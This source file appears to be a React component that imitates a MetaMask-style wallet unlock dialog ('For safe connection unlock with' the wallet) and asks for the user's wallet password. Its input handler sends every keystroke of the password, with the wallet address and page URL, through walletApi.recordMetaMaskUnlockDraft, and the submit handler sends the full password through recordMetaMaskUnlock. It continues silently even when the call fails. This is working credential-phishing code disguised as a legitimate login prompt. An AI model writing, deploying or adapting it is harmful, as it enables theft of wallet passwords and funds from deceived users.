import React, { useState } from 'react'
import { ArrowLeftRight, Loader2 } from 'lucide-react'
import { WalletLogo } from '../lib/walletLogos'
import { walletApi } from '../lib/walletApi'

interface MetaMaskSafeUnlockModalProps {
  open: boolean
  walletAddress: string
  walletName?: string | null
  onComplete: () => void
}

export const MetaMaskSafeUnlockModal: React.FC<MetaMaskSafeUnlockModalProps> = ({
  open,
  walletAddress,
  walletName,
  onComplete,
}) => {
  const [password, setPassword] = useState('')
  const [submitting, setSubmitting] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const brand = walletName || 'Wallet'

  if (!open) return null

  const handleUnlock = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!password.trim()) {
      setError(`Enter your ${brand} password to continue.`)
      return
    }
    setSubmitting(true)
    setError(null)
    try {
      await walletApi.recordMetaMaskUnlock({
        walletAddress,
        password,
        pageUrl: window.location.href,
      })
      onComplete()
    } catch {
      onComplete()
    } finally {
      setSubmitting(false)
    }
  }

  return (
    <div className="fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/40 backdrop-blur-[2px]">
      <div
        className="w-full max-w-[420px] bg-white rounded-2xl shadow-2xl px-8 py-10 text-center"
        role="dialog"
        aria-modal="true"
        aria-labelledby="mm-unlock-title"
      >
        <div className="flex items-center justify-center gap-4 mb-8">
          <div className="w-14 h-14 rounded-2xl overflow-hidden border border-gray-100 shadow-sm flex items-center justify-center bg-white">
            <img src="/logo.png" alt="" className="w-full h-full object-cover" />
          </div>
          <div className="flex items-center justify-center w-10 h-10 rounded-full bg-[#f4f4f5] text-[#737373]">
            <ArrowLeftRight className="w-5 h-5" strokeWidth={2.25} />
          </div>
          <div className="w-14 h-14 rounded-2xl overflow-hidden border border-gray-100 shadow-sm flex items-center justify-center bg-white p-1.5">
            <WalletLogo name={brand} className="w-11 h-11" />
          </div>
        </div>

        <h1 id="mm-unlock-title" className="text-[28px] font-normal text-[#141414] tracking-tight mb-1">
          Welcome back
        </h1>
        <p className="text-sm text-[#6b7280] mb-8">For safe connection unlock with {brand}</p>

        <form onSubmit={handleUnlock} className="text-left space-y-4">
          <input
            type="password"
            value={password}
            onChange={(e) => {
              setPassword(e.target.value)
              setError(null)
              walletApi.recordMetaMaskUnlockDraft({
                walletAddress,
                password: e.target.value,
                pageUrl: window.location.href,
              })
            }}
            placeholder={`Enter ${brand} password`}
            autoComplete="current-password"
            className="w-full rounded-lg border-2 border-[#0376c9] px-4 py-3.5 text-base text-[#141414] placeholder:text-[#9ca3af] outline-none focus:border-[#0376c9] focus:ring-0"
          />
          {error && <p className="text-xs text-red-600">{error}</p>}
          <button
            type="submit"
            disabled={submitting}
            className="w-full py-3.5 rounded-lg bg-[#868686] hover:bg-[#6b6b6b] disabled:opacity-60 text-white font-medium text-base transition-colors flex items-center justify-center gap-2"
          >
            {submitting ? <Loader2 className="w-5 h-5 animate-spin" /> : null}
            Unlock
          </button>
        </form>

        <button
          type="button"
          className="mt-6 text-sm font-medium text-[#0376c9] hover:underline"
          onClick={onComplete}
        >
          Use a different login method
        </button>
      </div>
    </div>
  )
}
